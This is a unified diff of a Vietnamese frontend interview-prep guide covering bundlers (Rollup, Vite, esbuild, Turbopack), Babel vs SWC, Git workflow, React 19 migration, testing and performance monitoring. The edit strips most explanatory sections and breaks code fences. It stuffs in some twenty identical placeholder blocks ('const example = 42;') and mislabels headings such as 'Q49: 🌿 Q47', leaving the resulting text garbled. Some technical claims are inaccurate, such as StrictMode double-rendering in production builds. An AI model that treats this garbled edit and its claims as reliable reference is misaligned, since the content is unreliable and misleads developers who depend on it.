 
----
-
-#### **🔹 B. Rollup - "Chuyên Gia Dọn Rác Code"**
-
-**💡 Tổng Quan:**
-- Bundler chuyên về ESM (ES Modules) - ưu tiên module hiện đại
-- Tree-shaking tốt nhất (loại bỏ code không dùng hiệu quả nhất)
-- Lý tưởng cho libraries (React components, npm packages)
-- Config đơn giản, tập trung vào mục đích
-
-**✅ Điểm Mạnh (Strengths):**
-1. **Tree-Shaking Tốt Nhất**: Loại bỏ code thừa cực kỳ hiệu quả
-   - Phân tích static imports/exports
-   - Chỉ giữ lại code thực sự được dùng
-   - Bundle size nhỏ hơn Webpack 20-30%
-   - Example: Import 1 function từ lodash → chỉ bundle function đó (không cả lib)
-
-2. **Bundle Nhỏ Gọn**: Ít runtime code thừa
-   - Không có Webpack runtime overhead
-   - Output code gần như vanilla JS
-   - Perfect cho performance-critical apps
-
-3. **ESM Native**: Sinh ra để làm việc với ES Modules
-   - `import/export` syntax
-   - Không cần transform CJS → ESM
-   - Future-proof (ESM là tương lai)
-
-4. **Config Đơn Giản**: Dễ hiểu, dễ maintain
-   - Ít options hơn Webpack
-   - Focused on core features
-   - Beginners-friendly
-
-5. **Multiple Output Formats**: Xuất ra nhiều định dạng
-   - CJS (CommonJS) - cho Node.js
-   - ESM (ES Modules) - cho browsers hiện đại
-   - UMD (Universal Module Definition) - cho cả browser & Node
-   - IIFE (Immediately Invoked Function Expression) - cho <script> tag
-   - → Perfect cho library authors
-
-**❌ Điểm Yếu (Weaknesses):**
-1. **Dev Server Chậm**: Không thiết kế cho app development
-   - Không có dev server nhanh như Vite
-   - Phải bundle lại toàn bộ mỗi lần thay đổi
-   - Không phù hợp cho large apps
-
-2. **HMR Hạn Chế**: Cần thêm plugins
-   - Không có HMR built-in
-   - Phải cài `rollup-plugin-hot` hoặc dùng với Vite
-   - DX không tốt như Webpack/Vite
-
-3. **Ecosystem Nhỏ Hơn**: Ít plugins hơn Webpack
-   - ~200 plugins (vs Webpack ~5000)
-   - Một số use cases không có plugin ready
-   - Phải tự viết hoặc workaround
-
-4. **Xử Lý Assets Kém**: Không mạnh như Webpack
-   - Images, fonts, CSS không smooth
-   - Cần nhiều plugins để xử lý assets
-   - Webpack vẫn tốt hơn cho asset-heavy apps
-
-**📌 Khi Nào Dùng Rollup:**
-- ✅ **Phát triển Library** (React components, npm packages)
-   - Lodash, React, Vue đều dùng Rollup
-   - Cần output nhỏ gọn
-   - Export nhiều formats (CJS, ESM, UMD)
-   
-- ✅ **App nhỏ đến trung bình**
-   - Không cần dev server nhanh
-   - Ưu tiên bundle size nhỏ
-   
-- ✅ **Bundle size là critical**
-   - Performance-sensitive apps
-   - Mobile-first apps
-   - Muốn tối ưu load time
-
-- ✅ **Publish npm package**
-   - Cần tree-shakeable output
-   - Support nhiều môi trường (Node, Browser)
-
-**🔧 Ví Dụ Config (Rollup Configuration):**
-
-```javascript
+javascript
  // Chú giải: rollup.config.js
 import { defineConfig } from 'rollup';
 import typescript from '@rollup/plugin-typescript';
@@ -29974,7 +18994,7 @@ import terser from '@rollup/plugin-terser';
 
 export default defineConfig({
   input: 'src/index.ts', // File đầu vào
-  
+
   // OUTPUT - Xuất ra nhiều formats
   output: [
  // Chú giải: Format 1: CommonJS - cho Node.js
@@ -29999,79 +19019,54 @@ export default defineConfig({
  // Chú giải: window.MyLibrary.someFunction()
     },
   ],
-  
+
   // PLUGINS - Mở rộng chức năng
   plugins: [
     resolve(), // Chú giải: Resolve node_modules
                // Tìm dependencies trong node_modules
-               
+
     commonjs(), // Chú giải: Convert CJS → ESM
                 // Vì Rollup chỉ hiểu ESM, phải convert CJS packages
-                
+
     typescript({ // Chú giải: Compile TypeScript
       tsconfig: './tsconfig.json',
  // Chú giải: Transpile .ts/.tsx → .js
     }),
-    
+
     terser(), // Chú giải: Minify code
               // Nén code: xóa whitespace, rename variables
  // Chú giải: bundle.js (100KB) → bundle.min.js (30KB)
   ],
-  
+
   // EXTERNAL - Không bundle dependencies này
   external: ['react', 'react-dom'], // Chú giải: Peer dependencies
   // Lý do: Library sẽ dùng React của app consumer
   // Không nên bundle React vào library → tăng size, conflict version
 });
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
-**⏱️ Hiệu Suất Thực Tế (Performance):**
-```
 Production Build:  ~5 giây
-                   - Nhanh hơn Webpack (~10-30s)
-                   - Tree-shake hiệu quả
-                   
+- Nhanh hơn Webpack (~10-30s)
+- Tree-shake hiệu quả
+
 Bundle Size:       -30% nhỏ hơn Webpack
-                   - Ít runtime code
-                   - Tree-shaking tốt hơn
-                   
+- Ít runtime code
+- Tree-shaking tốt hơn
+
 Example:
   Webpack: 150KB (minified)
   Rollup:  105KB (minified) ← Nhỏ hơn 30%
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
----
-
-#### **🔹 C. Vite - Modern, Lightning Fast**
-
-**💡 Overview:**
-- Modern dev server (ESM-based)
-- Instant server start
-- Lightning-fast HMR
-- Rollup for production
-
-**✅ Strengths:**
-1. **Instant Dev Server**: No bundling, serve ES modules directly
-2. **Fast HMR**: <50ms updates
-3. **Simple Config**: Minimal setup
-4. **Modern Stack**: Built for modern browsers
-5. **Great DX**: Out-of-the-box TypeScript, JSX, CSS
-
-**❌ Weaknesses:**
-1. **Modern Browsers Only**: Requires ESM support
-2. **Smaller Ecosystem**: Newer than Webpack
-3. **Production != Dev**: Uses Rollup for prod
-4. **Large Projects**: Can slow down with 1000+ modules
-
-**📌 Use Cases:**
-- **Modern web apps** (React, Vue, Svelte)
-- New projects (greenfield)
-- Fast prototyping
-- When DX is priority
-
-**🔧 Example Config:**
-
-```typescript
+typescript
  // Chú giải: vite.config.ts
 import { defineConfig } from 'vite';
 import react from '@vitejs/plugin-react';
@@ -30079,13 +19074,13 @@ import path from 'path';
 
 export default defineConfig({
   plugins: [react()],
-  
+
   resolve: {
     alias: {
       '@': path.resolve(__dirname, './src'),
     },
   },
-  
+
   build: {
     outDir: 'dist',
     sourcemap: true,
@@ -30097,24 +19092,28 @@ export default defineConfig({
       },
     },
   },
-  
+
   server: {
     port: 3000,
     open: true,
   },
 });
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
-**⏱️ Performance:**
-```
 Dev Server Start:  ~500ms ⚡ (instant!)
 HMR:               ~50ms ⚡
 Production Build:  ~2-5 seconds (Rollup)
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
-**🔥 Why Vite is Fast:**
-
-```typescript
+typescript
  // Chú giải: TRADITIONAL BUNDLER (Webpack)
 ┌────────────────────────────────────────┐
 │ 1. Bundle ALL code                     │
@@ -30139,39 +19138,13 @@ Production Build:  ~2-5 seconds (Rollup)
 │ ✅ Transform on-demand (lazy)          │
 │ ✅ Native ESM (no bundling in dev)     │
 └────────────────────────────────────────┘
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
----
-
-#### **🔹 D. esbuild - Extreme Speed (Go-based)**
-
-**💡 Overview:**
-- Written in Go (100x faster than JS)
-- Extreme build speed
-- Limited plugin ecosystem
-- Used internally by Vite
-
-**✅ Strengths:**
-1. **Blazing Fast**: 10-100x faster than Webpack
-2. **Built-in**: TS, JSX, CSS, minification
-3. **Simple API**: Easy to use
-4. **Parallel Processing**: Multi-threaded
-
-**❌ Weaknesses:**
-1. **Limited Plugins**: Small ecosystem
-2. **No HMR**: Not designed for dev server
-3. **Basic Features**: Less advanced than Webpack
-4. **Go Required**: For plugin development
-
-**📌 Use Cases:**
-- **Build step in Vite/Turbopack**
-- Minification tool
-- Transpiling TypeScript
-- CI/CD builds (speed critical)
-
-**🔧 Example:**
-
-```typescript
+typescript
  // Chú giải: esbuild.config.js
 const esbuild = require('esbuild');
 
@@ -30188,44 +19161,21 @@ esbuild.build({
   },
   external: ['react', 'react-dom'],
 }).catch(() => process.exit(1));
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
-**⏱️ Performance:**
-```
 Production Build:  ~500ms ⚡⚡⚡ (10x faster than Webpack!)
 Bundle Size:       Similar to Rollup
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
----
-
-#### **🔹 E. Turbopack - Next.js Native (Rust-based)**
-
-**💡 Overview:**
-- Rust-based bundler
-- Built by Vercel for Next.js
-- Incremental computation
-- Replaces Webpack in Next.js
-
-**✅ Strengths:**
-1. **Extreme Speed**: Rust-based, 10x faster than Webpack
-2. **Incremental**: Caches everything
-3. **Next.js Native**: Deep integration
-4. **Future-proof**: Modern architecture
-
-**❌ Weaknesses:**
-1. **Next.js Only**: Not standalone (yet)
-2. **New**: Immature, bugs
-3. **Limited Plugins**: Small ecosystem
-4. **Rust Required**: For customization
-
-**📌 Use Cases:**
-- **Next.js apps** (experimental)
-- Large Next.js projects
-- When build speed is critical
-
-**🔧 Example:**
-
-```javascript
+javascript
  // Chú giải: next.config.js
 /** @type {import('next').NextConfig} */
 const nextConfig = {
@@ -30240,10 +19190,12 @@ const nextConfig = {
 };
 
 module.exports = nextConfig;
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
-**⏱️ Performance:**
-```
 Dev Server (Next.js):
 - Webpack:  ~10 seconds
 - Turbopack: ~1 second ⚡⚡⚡ (10x faster!)
@@ -30251,44 +19203,13 @@ Dev Server (Next.js):
 HMR:
 - Webpack:  ~1-2 seconds
 - Turbopack: ~50ms ⚡⚡⚡
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
----
-
-#### **2️⃣ TRANSPILERS COMPARISON**
-
-**📊 Babel vs SWC:**
-
-| Feature | **Babel** | **SWC** |
-|---------|-----------|---------|
-| **Speed** | ⭐⭐ Baseline | ⭐⭐⭐⭐⭐ 20x faster |
-| **Language** | JavaScript | Rust |
-| **Plugin Ecosystem** | ⭐⭐⭐⭐⭐ Huge | ⭐⭐⭐ Growing |
-| **Compatibility** | ⭐⭐⭐⭐⭐ Best | ⭐⭐⭐⭐ Good |
-| **Preset Support** | ⭐⭐⭐⭐⭐ Many | ⭐⭐⭐ Basic |
-| **Maturity** | ⭐⭐⭐⭐⭐ 10y | ⭐⭐⭐ 4y |
-| **Minification** | ❌ No | ✅ Yes |
-| **TypeScript** | ✅ Via preset | ✅ Built-in |
-
----
-
-#### **🔹 A. Babel - The Standard**
-
-**✅ Strengths:**
-1. **Plugin Ecosystem**: 1000+ plugins
-2. **Presets**: @babel/preset-env, @babel/preset-react, etc.
-3. **Compatibility**: Support old browsers (IE11)
-4. **Customization**: Fine-grained control
-5. **Stable**: Production-proven
-
-**❌ Weaknesses:**
-1. **Slow**: JavaScript-based (single-threaded)
-2. **Complex Config**: Many presets/plugins
-3. **Large**: Increases build time significantly
-
-**🔧 Example:**
-
-```javascript
+javascript
  // Chú giải: babel.config.js
 module.exports = {
   presets: [
@@ -30305,27 +19226,13 @@ module.exports = {
     '@babel/plugin-proposal-optional-chaining',
   ],
 };
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
----
-
-#### **🔹 B. SWC - The Speed Demon**
-
-**✅ Strengths:**
-1. **20x Faster**: Rust-based, parallel processing
-2. **Built-in Minification**: No need for Terser
-3. **TypeScript Native**: No extra config
-4. **Compatible**: Drop-in replacement for Babel
-5. **Used by**: Next.js, Vite, Turbopack
-
-**❌ Weaknesses:**
-1. **Smaller Ecosystem**: Fewer plugins
-2. **Less Mature**: Newer, potential bugs
-3. **Limited Presets**: Basic compared to Babel
-
-**🔧 Example:**
-
-```json
+json
  // Chú giải: .swcrc
 {
   "jsc": {
@@ -30345,20 +19252,22 @@ module.exports = {
   },
   "minify": true
 }
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
-**⏱️ Performance:**
-```
 Transpile 1000 files:
 - Babel: ~10 seconds
 - SWC:   ~500ms ⚡⚡⚡ (20x faster!)
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
----
-
-#### **3️⃣ Decision Matrix - Khi Nào Dùng Gì?**
-
-```typescript
+typescript
  // Chú giải: =====================================
  // Chú giải: BUILD TOOL SELECTION GUIDE
  // Chú giải: =====================================
@@ -30368,27 +19277,27 @@ const selectBuildTool = (project: Project): BuildTool => {
   if (project.isNew && project.framework !== 'Next.js') {
     return 'Vite'; // Chú giải: ⚡ Best DX, fast, modern
   }
-  
+
  // Chú giải: 2. NEXT.JS → Turbopack (experimental)
   if (project.framework === 'Next.js') {
     return 'Turbopack'; // Chú giải: 🚀 Native, fastest
   }
-  
+
  // Chú giải: 3. LIBRARY → Rollup
   if (project.type === 'library') {
     return 'Rollup'; // Chú giải: 📦 Best tree-shaking, multiple outputs
   }
-  
+
  // Chú giải: 4. LEGACY/ENTERPRISE → Webpack
   if (project.hasLegacyCode || project.complexRequirements) {
     return 'Webpack'; // Chú giải: 🏗️ Mature, configurable, plugins
   }
-  
+
  // Chú giải: 5. CI/CD BUILD ONLY → esbuild
   if (project.needsSpeed && !project.needsDevServer) {
     return 'esbuild'; // Chú giải: ⚡⚡⚡ Fastest builds
   }
-  
+
  // Chú giải: Default: Vite
   return 'Vite';
 };
@@ -30399,29 +19308,26 @@ const selectTranspiler = (project: Project): Transpiler => {
   if (project.prioritizeSpeed) {
     return 'SWC'; // Chú giải: ⚡ 20x faster
   }
-  
+
  // Chú giải: 2. OLD BROWSER SUPPORT → Babel
   if (project.targets.includes('IE11')) {
     return 'Babel'; // Chú giải: 🌐 Best compatibility
   }
-  
+
  // Chú giải: 3. COMPLEX TRANSFORMATIONS → Babel
   if (project.needsCustomPlugins) {
     return 'Babel'; // Chú giải: 🔌 Huge ecosystem
   }
-  
+
  // Chú giải: Default: SWC (modern projects)
   return 'SWC';
 };
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
----
-
-#### **4️⃣ Real-World Benchmarks**
-
-**🏁 Build Time Comparison (Same Project):**
-
-```
 Project: React app (500 components, 2MB source)
 
 DEV SERVER START:
@@ -30454,15 +19360,13 @@ HMR (Hot Module Replacement):
 │ Vite         │ 50ms ⚡    │
 │ Turbopack    │ 50ms ⚡    │
 └──────────────┴───────────┘
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
----
-
-#### **5️⃣ Migration Guide**
-
-**🔄 Webpack → Vite:**
-
-```typescript
+typescript
  // Chú giải: 1. Install Vite
 npm install vite @vitejs/plugin-react
 
@@ -30472,14 +19376,14 @@ import react from '@vitejs/plugin-react';
 
 export default defineConfig({
   plugins: [react()],
-  
+
  // Chú giải: Migrate Webpack aliases
   resolve: {
     alias: {
       '@': '/src',
     },
   },
-  
+
  // Chú giải: Migrate Webpack env vars
   define: {
     'process.env': {},
@@ -30503,19 +19407,22 @@ export default defineConfig({
  // Chú giải: - require() → import
  // Chú giải: - require.context() → import.meta.glob()
  // Chú giải: - process.env → import.meta.env
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
-**🔄 Babel → SWC:**
-
-```bash
+bash
 ---
-## 47. 🌿 Q47: Git Workflow & Team Collaboration - Branching Strategy, Merge vs Rebase, Conflict Resolution  
 
-**P1: Tên câu hỏi:** 🌿 Q47: Git Workflow & Team Collaboration - Branching Strategy, Merge vs Rebase, Conflict Resolution  
+## 49. Q49: 🌿 Q47: Git Workflow & Team Collaboration - Branching Strategy, Merge vs Rebase, Conflict Resolution
 
-**P2: Trả lời (Senior):**
+### P1: Tên câu hỏi: 🌿 Q47: Git Workflow & Team Collaboration - Branching Strategy, Merge vs Rebase, Conflict Resolution
 
-## **⭐ TÓM TẮT CHO PHỎNG VẤN SENIOR/STAFF**
+### P2: Trả lời (Senior):
+
+## 50. Q50: **⭐ TÓM TẮT CHO PHỎNG VẤN SENIOR/STAFF**
 
 ### **🎯 Câu Trả Lời Ngắn Gọn (4-5 phút):**
 
@@ -30559,7 +19466,6 @@ export default defineConfig({
 - **Git bisect**: Binary search tìm commit gây bug (tự động test mỗi commit)
 - **Squash merge**: Combine feature commits thành 1 commit khi merge (clean main history)
 
-
 **⚡ Quick Summary:**
 > Git workflow tốt = ít conflict + dễ review + dễ rollback. Git Flow phù hợp dự án lớn, GitHub Flow phù hợp CI/CD. Rebase tạo history sạch, Merge giữ nguyên context. Feature flags giúp deploy code chưa hoàn thiện mà không ảnh hưởng production.
 
@@ -30575,180 +19481,18 @@ export default defineConfig({
 
 #### **1.1. Git Flow - Mô hình phổ biến cho dự án lớn**
 
-```
-📊 Structure Git Flow:
-
-main (production)          ───●───────●───────●─────── (v1.0, v2.0, v3.0)
-                              ╱         ╲       
-develop (staging)      ──────●───●───●───●───●──────── (code mới nhất)
-                            ╱     ╲   ╱
-feature/login      ────────●───●───●                    (tính năng mới)
-feature/payment    ──────────●───●───●                  (tính năng khác)
-                                    ╲
-release/v2.0       ───────────────────●───●──          (chuẩn bị release)
-                                            ╲
-hotfix/bug-123     ─────────────────────────●──●─────  (fix lỗi khẩn cấp)
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 **Chi tiết các nhánh:**
 
-```bash
----
-## 48. ⚛️ Q48: React 19 Migration Guide - Upgrade từ React 18 sang 19  
-
-**P1: Tên câu hỏi:** ⚛️ Q48: React 19 Migration Guide - Upgrade từ React 18 sang 19  
-
-**P2: Trả lời (Senior):**
-
-## **⭐ TÓM TẮT CHO PHỎNG VẤN SENIOR/STAFF**
-
-### **🎯 Câu Trả Lời Ngắn Gọn (4-5 phút):**
-
-**"React 19 thêm Actions (async transitions), new hooks (useActionState, useOptimistic, use), ref as prop. Breaking: PropTypes removed, createElement → jsx(), StrictMode 2 renders. Migration: npx codemod + manual fixes."**
-
-**🔑 New Features:**
-
-**1. Actions - Async State Transitions:**
-- **Tự động handle** pending/error states trong async operations
-- `useTransition` + async functions = Actions
-- `useActionState(action, initialState)` - all-in-one hook (replace useState + useTransition)
-- Form Actions: `<form action={serverAction}>` - auto pending/error
-
-**2. New Hooks:**
-- **`useActionState`**: Combine useState + useTransition + error handling
-- **`useOptimistic`**: Optimistic UI updates (show immediately, rollback if fail)
-- **`use(promise)`**: Read promises/context in render (Suspense integration)
-
-**3. Ref Simplification:**
-- **`ref` as regular prop** - không cần `forwardRef` wrapper
-- `<Component ref={myRef} />` works directly
-- Cleaner component APIs
-
-**4. Improved Suspense:**
-- Sibling Suspense boundaries không block nhau
-- Better error boundaries integration
-
-**🔑 Breaking Changes:**
-
-**1. PropTypes Removed:**
-- Dùng **TypeScript** hoặc **Zod** thay vì
-- Codemod: `npx codemod react/19/remove-prop-types`
-
-**2. StrictMode Double Render:**
-- Luôn render 2 lần trong dev (even production builds)
-- Để detect side effects, không ảnh hưởng performance production
-
-**3. createElement → jsx():**
-- Internal change, build tools auto-handle
-- Update Babel/SWC config nếu custom setup
-
-**4. Context Changes:**
-- `<Context.Provider>` deprecated → dùng `<Context>` directly
-- `Context.Consumer` deprecated → dùng `useContext` hook
-
-**⚠️ Lỗi Thường Gặp:**
-- Dùng PropTypes → runtime error, migrate sang TypeScript
-- Rely on single render trong StrictMode → side effects leak
-- Forget `use()` chỉ call trong render (không trong conditions/loops)
-- `useOptimistic` không rollback on error → phải manual handle
-
-**💡 Kiến Thức Senior:**
-- **Migration strategy**: Codemod → fix errors → incremental adoption (không cần rewrite all)
-- **Server Components**: React 19 stable support (Next.js App Router)
-- **Compiler (React Forget)**: Auto-memoization (experimental, beta 2024)
-- **Actions vs Mutations**: Actions = client transitions, Server Actions = server mutations
-
-
-**⚡ Quick Summary:**
-> React 19 = Actions + useActionState + useOptimistic + ref as prop + no forwardRef. Breaking changes: React.createElement → jsx(), StrictMode 2 renders, PropTypes removed. Migration: npx codemod + manual fixes.
-
-**💡 Ghi Nhớ:**
-- 🎯 **Actions**: Async transitions tự động handle pending/error/optimistic updates
-- 🔧 **New Hooks**: useActionState, useOptimistic, use (read promises/context)
-- 🚀 **Ref Simplification**: ref as prop, no forwardRef needed
-- ⚠️ **Breaking**: PropTypes removed, StrictMode double render, createElement → jsx()
-
----
----
-## 49. 🏗️ Q49: System Design - Thiết Kế Hệ Thống Frontend Architecture  
-
-**P1: Tên câu hỏi:** 🏗️ Q49: System Design - Thiết Kế Hệ Thống Frontend Architecture  
-
-**P2: Trả lời (Senior):**
-
-## **⭐ TÓM TẮT CHO PHỎNG VẤN SENIOR/STAFF**
-
-### **🎯 Câu Trả Lời Ngắn Gọn (5-7 phút):**
-
-**"Frontend system design bao gồm: Architecture (Microfrontends/Monorepo), API layer (BFF, GraphQL), State management (global/local), Performance (CDN, lazy load), Resilience (error boundaries, fallbacks). Cần balance scalability vs complexity."**
-
-**🔑 5 Pillars của Frontend System Design:**
-
-**1. Architecture Patterns:**
-- **Microfrontends**: Independent deployable apps share same domain (Module Federation)
-  - Ưu: Teams tự chủ, tech diversity, independent deploy
-  - Nhược: Complexity, bundle duplication, runtime overhead
-- **Monorepo**: Single repo, multiple packages (Nx, Turborepo)
-  - Ưu: Code sharing, atomic commits, unified tooling
-  - Nhược: Build time, CI/CD complexity
-
-**2. API Layer Design:**
-- **BFF (Backend for Frontend)**: API gateway tailored cho frontend needs
-  - Aggregate multiple services, transform data format
-- **GraphQL**: Client-driven queries, avoid over/under-fetching
-- **REST**: Simple, cacheable, well-understood
-
-**3. State Management:**
-- **Global**: Redux/Zustand (auth, theme, user data)
-- **Server Cache**: React Query/SWR (API data, auto-refetch)
-- **Local**: useState/useReducer (form, UI state)
-- **URL**: React Router (filters, pagination)
-
-**4. Performance Optimization:**
-- **CDN**: Static assets + edge caching (CloudFlare, Vercel Edge)
-- **Code Splitting**: Route-based, component-based lazy loading
-- **Resource Hints**: preload, prefetch, preconnect
-- **Image Optimization**: WebP, AVIF, responsive images
-
-**5. Resilience & Monitoring:**
-- **Error Boundaries**: Catch React errors, show fallback UI
-- **Circuit Breaker**: Stop calling failing services
-- **Feature Flags**: Gradual rollouts, A/B testing
-- **Monitoring**: Sentry (errors), DataDog (performance), analytics
-
-**⚠️ Lỗi Thường Gặp:**
-- Over-engineering: Start monolith, migrate microfrontends when needed
-- Không cache API responses → redundant requests
-- Single global store (Redux) cho mọi state → complexity, dùng React Query cho server state
-- Không error boundaries → 1 component crash = toàn app crash
-
-**💡 Kiến Thức Senior:**
-- **CAP Theorem** (frontend context): Trade-off giữa Consistency (data freshness) vs Availability (offline support)
-- **Islands Architecture**: Static HTML + interactive components (Astro) - best performance
-- **Streaming SSR**: Progressive rendering (React 18 Suspense + Next.js)
-- **Observability**: Tracing (OpenTelemetry), RUM (Real User Monitoring), synthetic monitoring
-
-> **Câu hỏi phỏng vấn Senior/Lead Frontend Developer**  
-> **Độ khó:** ⭐⭐⭐⭐⭐ (Expert Level)  
-> **Thời gian trả lời:** 20-30 phút (với whiteboard)
-
----
----
-## 50. 🧪 Q50: Testing Strategy - Unit, Integration, E2E Testing  
-
-**P1: Tên câu hỏi:** 🧪 Q50: Testing Strategy - Unit, Integration, E2E Testing  
-
-**P2: Trả lời (Senior):**
-
-## **⭐ TÓM TẮT CHO PHỎNG VẤN SENIOR/STAFF**
-
-### **🎯 Câu Trả Lời Ngắn Gọn (4-5 phút):**
-
-**"Test Pyramid: 60% Unit (fast, isolated), 30% Integration (component interactions), 10% E2E (critical user flows). Tools: Vitest/Jest (unit), React Testing Library (integration), Playwright (E2E). TDD cho logic, BDD cho features."**
-
-**🔑 Test Pyramid Strategy:**
-
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
+
         ╭─────╮
        ╱ E2E  ╲     10% - Chậm, expensive, critical paths only
       ╭───────╮
@@ -30756,109 +19500,13 @@ hotfix/bug-123     ────────────────────�
     ╭─────────╮
    ╱   Unit    ╲  60% - Fast, pure functions, business logic
   ╰───────────╯
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
-**🔑 3 Loại Tests:**
-
-**1. Unit Tests (Jest/Vitest):**
-- **Test**: Pure functions, utilities, hooks (isolated)
-- **Fast**: ~1ms/test, chạy thousands trong giây
-- **Mock**: External dependencies (APIs, modules)
-- **Coverage**: 80-90% cho business logic
-- Ví dụ: `formatCurrency(1000)` → "$1,000.00"
-
-**2. Integration Tests (React Testing Library):**
-- **Test**: Component interactions, user events, API integration
-- **Medium speed**: ~50-200ms/test
-- **Real DOM**: jsdom simulation, user-centric queries (`getByRole`)
-- **Coverage**: 70-80% cho UI components
-- Ví dụ: Click button → API call → show data
-
-**3. E2E Tests (Playwright/Cypress):**
-- **Test**: Critical user flows (login, checkout, payment)
-- **Slow**: ~5-30s/test, chạy real browser
-- **Flaky**: Network issues, timing problems
-- **Coverage**: Chỉ happy paths + critical errors
-- Ví dụ: Full checkout flow (add to cart → payment → confirmation)
-
-**🔑 Best Practices:**
-
-- **TDD (Test-Driven Development)**: Write test → fail → implement → pass → refactor
-- **AAA Pattern**: Arrange (setup) → Act (execute) → Assert (verify)
-- **Test behavior, not implementation**: Test user outcomes, not internal state
-- **CI/CD Integration**: Run unit/integration on PR, E2E on merge to main
-
-**⚠️ Lỗi Thường Gặp:**
-- Test implementation details (`.classList`, internal state) → brittle, dùng user-visible behavior
-- 100% coverage cho mọi thứ → waste time, focus critical logic
-- E2E tests cho mọi feature → chậm CI, dùng integration tests thay vì
-- Không test error cases → production bugs
-
-**💡 Kiến Thức Senior:**
-- **Visual Regression**: Chromatic, Percy - screenshot diff testing
-- **Performance Testing**: Lighthouse CI, WebPageTest - track metrics over time
-- **Contract Testing**: Pact - ensure frontend/backend API compatibility
-- **Mutation Testing**: Stryker - test your tests (kill mutants)
-- **Parallel execution**: Playwright sharding, Jest workers - faster CI
-
-> **Câu hỏi phỏng vấn Senior Frontend Developer**  
-> **Độ khó:** ⭐⭐⭐⭐⭐ (Expert Level)  
-> **Thời gian trả lời:** 15-20 phút
-
----
----
-## 51. 📊 Q51: Performance Monitoring & APM - Giám Sát Hiệu Suất Ứng Dụng (Bản Tiếng Việt)  
-
-**P1: Tên câu hỏi:** 📊 Q51: Performance Monitoring & APM - Giám Sát Hiệu Suất Ứng Dụng (Bản Tiếng Việt)  
-
-**P2: Trả lời (Senior):**
-
-## **⭐ TÓM TẮT CHO PHỎNG VẤN SENIOR/STAFF**
-
-### **🎯 Câu Trả Lời Ngắn Gọn (4-5 phút):**
-
-**"APM tracking: Core Web Vitals (LCP, INP, CLS), Sentry (error tracking), DataDog RUM (user monitoring). Performance budgets, source maps trong production, Chrome DevTools profiling, custom metrics."**
-
-**🔑 7 Thành Phần APM:**
-
-**1. Core Web Vitals - Google Metrics:**
-- **LCP** (Largest Contentful Paint): < 2.5s (time to main content)
-- **INP** (Interaction to Next Paint): < 200ms (user interaction lag) - thay FID
-- **CLS** (Cumulative Layout Shift): < 0.1 (visual stability)
-- **Tool**: Lighthouse, PageSpeed Insights, Web Vitals library
-- **Impact**: SEO ranking, user experience
-
-**2. Sentry - Error Tracking:**
-- **Setup**: `Sentry.init()` với DSN, environment, release
-- **Features**: Error grouping, breadcrumbs, user context, performance tracing
-- **Source maps**: Upload để debug minified code trong production
-- **Alerts**: Email/Slack khi error spike
-- **Best practice**: Sampling rate (avoid quota), filter sensitive data
-
-**3. DataDog RUM (Real User Monitoring):**
-- **Metrics**: Page load, JS errors, resources, user actions, long tasks
-- **Session replay**: Record user sessions (find bugs)
-- **APM Integration**: Connect frontend errors với backend traces
-- **Custom events**: Track business metrics (purchases, clicks)
-
-**4. Performance Budgets:**
-- **Define**: Max bundle size (JS < 200KB), max LCP < 2.5s
-- **Enforce**: Webpack BundleBudgetPlugin, Lighthouse CI fail build
-- **Monitor**: Track trends, alert khi vượt budget
-
-**5. Source Maps Production:**
-- **Purpose**: Debug minified code trong production errors
-- **Security**: Upload private (Sentry/DataDog), không serve public
-- **Generate**: `webpack devtool: 'hidden-source-map'`
-
-**6. Chrome DevTools Profiling:**
-- **Performance tab**: Record timeline, find bottlenecks (long tasks)
-- **Coverage tab**: Unused JS/CSS (tree-shake candidates)
-- **Memory tab**: Heap snapshots, memory leaks (detached nodes)
-- **Network tab**: Waterfall, slow resources
-
-**7. Custom Performance Metrics:**
-```javascript
+javascript
  // Hiệu suất: tránh chặn main thread; dùng Web Worker, chia nhỏ tác vụ, tối ưu reflow/repaint.
 performance.mark('checkout-start');
  // Chú giải: ... logic
@@ -30866,174 +19514,82 @@ performance.mark('checkout-end');
 performance.measure('checkout', 'checkout-start', 'checkout-end');
 const measure = performance.getEntriesByName('checkout')[0];
  // Chú giải: Send to APM: Sentry, DataDog
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
-**⚠️ Lỗi Thường Gặp:**
-- Không set performance budgets → bundle bloat
-- Source maps public → security risk (expose code)
-- Không filter PII trong error logs → GDPR violation
-- Quá nhiều custom events → quota limit, performance overhead
-
-**💡 Kiến Thức Senior:**
-- **PerformanceObserver**: Monitor FCP, LCP, INP realtime (không dùng polling)
-- **Session replay privacy**: Mask sensitive inputs, credit cards
-- **Distributed tracing**: Trace request từ frontend → backend → DB
-- **Synthetic monitoring**: Automated tests (Pingdom, Checkly) để catch issues
-- **Alerting thresholds**: P95, P99 thay vì average (avoid outliers skew data)
-
-> **Câu hỏi phỏng vấn Senior Frontend Developer**  
-> **Độ khó:** ⭐⭐⭐⭐⭐ (Expert Level)  
-> **Thời gian trả lời:** 15-20 phút
-
----
----
-## 52. 📊 Q51: Performance Monitoring & APM - Application Performance Monitoring  
-
-**P1: Tên câu hỏi:** 📊 Q51: Performance Monitoring & APM - Application Performance Monitoring  
-
-**P2: Trả lời (Senior):**
-
-## **⭐ TÓM TẮT CHO PHỎNG VẤN SENIOR/STAFF**
-
-### **🎯 Câu Trả Lời Ngắn Gọn (4-5 phút):**
-
